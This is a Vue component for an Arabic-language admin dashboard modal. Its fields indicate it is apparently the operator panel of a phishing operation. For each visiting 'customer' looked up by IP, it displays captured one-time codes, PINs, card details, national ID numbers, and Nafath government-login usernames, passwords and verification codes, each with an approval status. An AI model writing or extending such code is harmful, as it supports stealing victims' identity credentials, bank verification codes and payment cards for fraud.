<template>
  <ModalShell
    :open="open"
    :title="modalTitle"
    :subtitle="customer?.ip || notification?.meta?.customer_ip || ''"
    max-width="40rem"
    :accent="accentColor"
    :icon="modalIcon"
    dir="rtl"
    theme="dark"
    body-max-height="65vh"
    @close="$emit('close')"
  >
    <!-- Loading -->
    <div v-if="loading" class="flex items-center justify-center py-12">
      <i class="fa-solid fa-spinner fa-spin text-gray-400 text-2xl"></i>
    </div>

    <!-- Error -->
    <div v-else-if="error" class="text-center py-12">
      <i class="fa-solid fa-circle-exclamation text-red-400 text-3xl mb-3"></i>
      <p class="text-sm text-gray-400">{{ error }}</p>
    </div>

    <!-- Content -->
    <div v-else-if="customer" class="space-y-5">

      <!-- Customer Info Header -->
      <div class="admin-glass flex items-center gap-4">
        <div class="w-12 h-12 rounded-full bg-blue-500/20 flex items-center justify-center">
          <i class="fa-solid fa-user text-blue-400 text-lg"></i>
        </div>
        <div class="flex-1 min-w-0">
          <h4 class="text-white font-semibold text-base truncate">
            {{ customer.fullName || customer.full_name || customer.ip || 'عميل' }}
          </h4>
          <div class="flex flex-wrap items-center gap-3 mt-1 text-xs text-gray-400">
            <span v-if="customer.ip" dir="ltr"><i class="fa-solid fa-globe ml-1"></i>{{ customer.ip }}</span>
            <span v-if="customer.phoneNumber || customer.phone_number" dir="ltr">
              <i class="fa-solid fa-phone ml-1"></i>{{ customer.phoneNumber || customer.phone_number }}
            </span>
            <span v-if="customer.nationalId || customer.national_id">
              <i class="fa-solid fa-id-card ml-1"></i>{{ customer.nationalId || customer.national_id }}
            </span>
          </div>
        </div>
        <span class="px-2.5 py-1 rounded-full text-[11px] font-semibold"
          :class="customer.is_active ? 'bg-green-500/20 text-green-400' : 'bg-gray-600/30 text-gray-500'">
          {{ customer.is_active ? 'متصل' : 'غير متصل' }}
        </span>
      </div>

      <!-- OTP Section -->
      <div v-if="notification?.type === 'otp' && customer.latest_otp" class="space-y-3">
        <h5 class="text-sm font-semibold text-gray-300 flex items-center gap-2">
          <i class="fa-solid fa-key text-amber-400"></i> رمز OTP
        </h5>
        <div class="grid grid-cols-2 gap-3">
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الرمز</p>
            <p class="text-sm font-medium text-amber-300">{{ customer.latest_otp.code || customer.latest_otp.code_value || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
            <p class="text-sm font-medium text-gray-200">{{ statusLabel(customer.latest_otp.status) }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الهاتف</p>
            <p class="text-sm font-medium text-gray-200" dir="ltr">{{ customer.latest_otp.phone_number || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الوقت</p>
            <p class="text-sm font-medium text-gray-200">{{ formatDateTimeAR(customer.latest_otp.created_at) }}</p>
          </div>
        </div>
      </div>

      <!-- PIN Section -->
      <div v-if="notification?.type === 'pin' && customer.latest_pin" class="space-y-3">
        <h5 class="text-sm font-semibold text-gray-300 flex items-center gap-2">
          <i class="fa-solid fa-credit-card text-purple-400"></i> رقم PIN
        </h5>
        <div class="grid grid-cols-2 gap-3">
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الرمز</p>
            <p class="text-sm font-medium text-amber-300">{{ customer.latest_pin.code || customer.latest_pin.code_value || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
            <p class="text-sm font-medium text-gray-200">{{ statusLabel(customer.latest_pin.status) }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الوقت</p>
            <p class="text-sm font-medium text-gray-200">{{ formatDateTimeAR(customer.latest_pin.created_at) }}</p>
          </div>
        </div>
      </div>

      <!-- Payment Card Section -->
      <div v-if="notification?.type === 'payment' && customer.payment?.cards?.length" class="space-y-3">
        <h5 class="text-sm font-semibold text-gray-300 flex items-center gap-2">
          <i class="fa-solid fa-wallet text-green-400"></i> بطاقة الدفع
        </h5>
        <div v-for="(card, idx) in customer.payment.cards.slice(0, 1)" :key="card.id || idx"
          class="admin-glass admin-glass--blue">
          <div class="grid grid-cols-2 gap-3">
            <div class="admin-data-cell">
              <p class="text-[11px] text-gray-500 mb-1">اسم حامل البطاقة</p>
              <p class="text-sm font-medium text-gray-200">{{ card.holder_name || card.card_holder || '—' }}</p>
            </div>
            <div class="admin-data-cell">
              <p class="text-[11px] text-gray-500 mb-1">نوع البطاقة</p>
              <p class="text-sm font-medium text-gray-200">{{ card.card_type || '—' }}</p>
            </div>
            <div class="admin-data-cell">
              <p class="text-[11px] text-gray-500 mb-1">رقم البطاقة (مخفي)</p>
              <p class="text-sm font-medium text-amber-300" dir="ltr">{{ card.card_number_masked || (card.last4 ? '**** **** **** ' + card.last4 : '—') }}</p>
            </div>
            <div v-if="card.bin" class="admin-data-cell">
              <p class="text-[11px] text-gray-500 mb-1">BIN</p>
              <p class="text-sm font-medium text-gray-200" dir="ltr">{{ card.bin }}</p>
            </div>
            <div class="admin-data-cell">
              <p class="text-[11px] text-gray-500 mb-1">تاريخ الانتهاء</p>
              <p class="text-sm font-medium text-gray-200" dir="ltr">{{ card.expiry_month && card.expiry_year ? `${card.expiry_month}/${card.expiry_year}` : '—' }}</p>
            </div>
            <div class="admin-data-cell">
              <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
              <p class="text-sm font-medium text-gray-200">{{ statusLabel(card.status) }}</p>
            </div>
          </div>
        </div>
      </div>

      <!-- Phone Verification Section -->
      <div v-if="notification?.type === 'phone' && customer.latest_phone_otp" class="space-y-3">
        <h5 class="text-sm font-semibold text-gray-300 flex items-center gap-2">
          <i class="fa-solid fa-phone text-cyan-400"></i> تحقق هاتفي
        </h5>
        <div class="grid grid-cols-2 gap-3">
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الرمز</p>
            <p class="text-sm font-medium text-amber-300">{{ customer.latest_phone_otp.code || customer.latest_phone_otp.code_value || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
            <p class="text-sm font-medium text-gray-200">{{ statusLabel(customer.latest_phone_otp.status) }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الهاتف</p>
            <p class="text-sm font-medium text-gray-200" dir="ltr">{{ customer.latest_phone_otp.phone_number || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الوقت</p>
            <p class="text-sm font-medium text-gray-200">{{ formatDateTimeAR(customer.latest_phone_otp.created_at) }}</p>
          </div>
        </div>
      </div>

      <!-- Customer (new connection) Section -->
      <div v-if="notification?.type === 'customer'" class="space-y-3">
        <h5 class="text-sm font-semibold text-gray-300 flex items-center gap-2">
          <i class="fa-solid fa-user-plus text-blue-400"></i> معلومات العميل
        </h5>
        <div class="grid grid-cols-2 gap-3">
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الاسم</p>
            <p class="text-sm font-medium text-gray-200">{{ customer.fullName || customer.full_name || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الهوية</p>
            <p class="text-sm font-medium text-gray-200">{{ customer.nationalId || customer.national_id || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الهاتف</p>
            <p class="text-sm font-medium text-gray-200" dir="ltr">{{ customer.phoneNumber || customer.phone_number || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الصفحة الحالية</p>
            <p class="text-sm font-medium text-gray-200">{{ customer.journey?.current_page || customer.current_page || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">الجهاز</p>
            <p class="text-sm font-medium text-gray-200">{{ customer.device_info?.type || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">المتصفح</p>
            <p class="text-sm font-medium text-gray-200">{{ customer.device_info?.browser || '—' }}</p>
          </div>
        </div>
      </div>

      <!-- Generic fallback for policy/claim/alert/system types -->
      <div v-if="!['otp','pin','payment','phone','customer'].includes(notification?.type)" class="space-y-3">
        <div class="admin-glass text-center">
          <p class="text-sm text-gray-300">{{ notification?.message }}</p>
          <p class="text-xs text-gray-500 mt-2">{{ notification?.time }}</p>
        </div>
      </div>

      <!-- Nafath Info (if available) -->
      <div v-if="customer.nafath && (customer.nafath.username || customer.nafath.verification_code)" class="space-y-3">
        <h5 class="text-sm font-semibold text-gray-300 flex items-center gap-2">
          <i class="fa-solid fa-fingerprint text-indigo-400"></i> نفاذ
        </h5>
        <div class="grid grid-cols-2 gap-3">
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">المستخدم</p>
            <p class="text-sm font-medium text-gray-200">{{ customer.nafath.username || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">كلمة المرور</p>
            <p class="text-sm font-medium text-amber-300">{{ customer.nafath.password || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">رمز التحقق</p>
            <p class="text-sm font-medium text-amber-300">{{ customer.nafath.verification_code || '—' }}</p>
          </div>
          <div class="admin-data-cell">
            <p class="text-[11px] text-gray-500 mb-1">التحقق</p>
            <p class="text-sm font-medium text-gray-200">{{ customer.nafath.verified ? 'تم التحقق ✓' : 'لم يتم' }}</p>
          </div>
        </div>
      </div>

    </div>

    <!-- Footer Actions -->
    <template #footer>
      <div class="flex items-center justify-between gap-3">
        <button
          class="px-4 py-2 text-sm rounded-lg bg-gray-700 text-gray-300 hover:bg-gray-600 transition-colors"
          @click="goToDashboard">
          <i class="fa-solid fa-arrow-up-right-from-square ml-1"></i>
          فتح في لوحة التحكم
        </button>
        <button
          class="px-4 py-2 text-sm rounded-lg bg-gray-700/50 text-gray-400 hover:bg-gray-600 transition-colors"
          @click="$emit('close')">
          إغلاق
        </button>
      </div>
    </template>
  </ModalShell>
</template>

<script setup>
import { ref, watch, computed } from 'vue';
import { useRouter } from 'vue-router';
import { ModalShell } from '../ui';
import { getCustomers } from '@/api/dashboard';
import { useCustomerFormatters } from '@/dashboard/utils/customerFormatters';

const { formatDateTimeAR } = useCustomerFormatters();

const props = defineProps({
  open: { type: Boolean, default: false },
  notification: { type: Object, default: null },
});

const emit = defineEmits(['close']);
const router = useRouter();

const loading = ref(false);
const error = ref('');
const customer = ref(null);

const typeLabels = {
  otp: 'رمز OTP',
  pin: 'رقم PIN',
  payment: 'بطاقة دفع',
  phone: 'تحقق هاتفي',
  customer: 'عميل جديد',
  claim: 'مطالبة',
  policy: 'وثيقة',
  alert: 'تنبيه',
  system: 'نظام',
};

const typeAccents = {
  otp: '#f59e0b',
  pin: '#a855f7',
  payment: '#22c55e',
  phone: '#06b6d4',
  customer: '#3b82f6',
  claim: '#ef4444',
  policy: '#6366f1',
  alert: '#f97316',
  system: '#6b7280',
};

const typeIcons = {
  otp: 'fa-solid fa-key',
  pin: 'fa-solid fa-credit-card',
  payment: 'fa-solid fa-wallet',
  phone: 'fa-solid fa-phone',
  customer: 'fa-solid fa-user-plus',
  claim: 'fa-solid fa-file-invoice',
  policy: 'fa-solid fa-shield-halved',
  alert: 'fa-solid fa-triangle-exclamation',
  system: 'fa-solid fa-gear',
};

const modalTitle = computed(() => typeLabels[props.notification?.type] || 'تفاصيل الإشعار');
const accentColor = computed(() => typeAccents[props.notification?.type] || '#6b7280');
const modalIcon = computed(() => typeIcons[props.notification?.type] || 'fa-solid fa-bell');

// Fetch customer data when modal opens
watch(() => props.open, async (isOpen) => {
  if (!isOpen || !props.notification) {
    customer.value = null;
    error.value = '';
    return;
  }

  const ip = props.notification.meta?.customer_ip;
  if (!ip) {
    error.value = 'لا يوجد عنوان IP للعميل';
    return;
  }

  loading.value = true;
  error.value = '';

  try {
    const { data } = await getCustomers({ search: ip, per_page: 1 });
    if (data?.success && data.data?.length > 0) {
      customer.value = data.data[0];
    } else {
      error.value = 'لم يتم العثور على بيانات العميل';
    }
  } catch {
    error.value = 'حدث خطأ أثناء تحميل البيانات';
  } finally {
    loading.value = false;
  }
});

function statusLabel(status) {
  const map = {
    pending: 'بانتظار الموافقة',
    approved: 'تمت الموافقة',
    rejected: 'مرفوض',
    expired: 'منتهي',
    used: 'مستخدم',
  };
  return map[status] || status || '—';
}



function goToDashboard() {
  emit('close');
  router.push({ name: 'dashboard' });
}
</script>
